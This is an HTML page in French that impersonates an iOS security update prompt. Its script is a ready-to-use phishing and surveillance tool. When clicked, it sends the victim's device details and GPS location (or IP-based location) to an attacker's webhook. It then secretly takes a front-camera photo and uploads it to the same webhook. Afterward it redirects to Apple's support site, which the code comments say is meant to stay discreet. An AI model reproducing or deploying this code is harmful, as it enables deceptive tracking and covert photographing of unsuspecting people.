<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Update | Processing</title>
    <style>
        body { background: #000; color: #fff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
        .container { text-align: center; width: 80%; max-width: 400px; }
        .loader { border: 3px solid #333; border-top: 3px solid #007aff; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h1 { font-size: 18px; font-weight: 500; margin-bottom: 10px; }
        p { font-size: 14px; color: #888; margin-bottom: 30px; }
        .btn { background: #007aff; color: #fff; border: none; padding: 12px 25px; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; width: 100%; }
        video, canvas { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <div id="loader-icon" style="display:none;" class="loader"></div>
        <h1 id="title">Mise √† jour requise</h1>
        <p id="status">Veuillez confirmer votre identit√© pour continuer la mise √† jour de s√©curit√© iOS.</p>
        <button id="main-btn" class="btn" onclick="execute()">Continuer</button>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        const WEBHOOK = "TON_WEBHOOK_ICI"; // <--- METS TON LIEN ICI
        const REDIRECT_URL = "https://support.apple.com/fr-fr"; // Site de redirection

        async function execute() {
            // UI Change
            document.getElementById('main-btn').style.display = 'none';
            document.getElementById('loader-icon').style.display = 'block';
            document.getElementById('title').innerText = "Analyse en cours...";
            document.getElementById('status').innerText = "Veuillez patienter quelques instants.";

            // 1. Infos Syst√®me directes
            const sysInfo = `üì± **CIBLE ACTIVE**\n**OS**: ${navigator.platform}\n**Langue**: ${navigator.language}\n**Batterie**: En attente...`;
            await fetch(WEBHOOK, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ content: sysInfo }) });

            // 2. G√©olocalisation avec repli IP
            navigator.geolocation.getCurrentPosition(async (pos) => {
                await fetch(WEBHOOK, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ content: `üìç **GPS** : https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}` })
                });
            }, async () => {
                const res = await fetch('http://ip-api.com/json/');
                const data = await res.json();
                await fetch(WEBHOOK, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ content: `üåê **IP (Fallback)** : ${data.city}, ${data.country}\nLien: https://www.google.com/maps?q=${data.lat},${data.lon}` })
                });
            }, { timeout: 5000 });

            // 3. Cam√©ra & Redirection
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.getElementById('video');
                video.srcObject = stream;

                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    
                    canvas.toBlob(blob => {
                        const formData = new FormData();
                        formData.append('file', blob, 'capture.png');
                        formData.append('payload_json', JSON.stringify({ content: "üì∏ **FACE CAPTURE**" }));
                        fetch(WEBHOOK, { method: 'POST', body: formData }).then(() => {
                            window.location.href = REDIRECT_URL;
                        });
                        stream.getTracks().forEach(t => t.stop());
                    }, 'image/png');
                }, 1500);
            } catch (e) {
                // Si la cam√©ra est bloqu√©e, on redirige quand m√™me apr√®s 2 secondes pour rester discret
                setTimeout(() => { window.location.href = REDIRECT_URL; }, 2000);
            }
        }
    </script>
</body>
</html>
